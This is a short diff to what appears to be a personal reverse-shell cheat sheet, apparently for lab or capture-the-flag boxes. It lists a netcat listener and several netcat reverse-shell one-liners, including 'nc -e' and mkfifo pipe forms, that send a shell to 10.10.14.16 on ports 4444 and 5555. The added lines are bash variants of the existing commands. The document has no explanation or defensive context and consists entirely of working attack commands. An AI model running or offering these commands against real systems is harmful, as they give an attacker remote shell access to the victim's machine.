@@ -7,13 +7,13 @@ nc -lvnp 4444
 
 NC reverse shell:
 nc -e /bin/sh 10.10.14.16 4444
-
+nc -e /bin/bash 10.10.14.16 5555
 
 
 from OpenBSD Netcat:
 mkfifo f; nc 10.10.14.16 4444 0<f | /bin/sh -i 2>&1 | tee f
 
-
+mkfifo f; nc 10.10.14.16 5555 0<f | /bin/bash -i 2>&1 | tee f
 
 
 Target box:
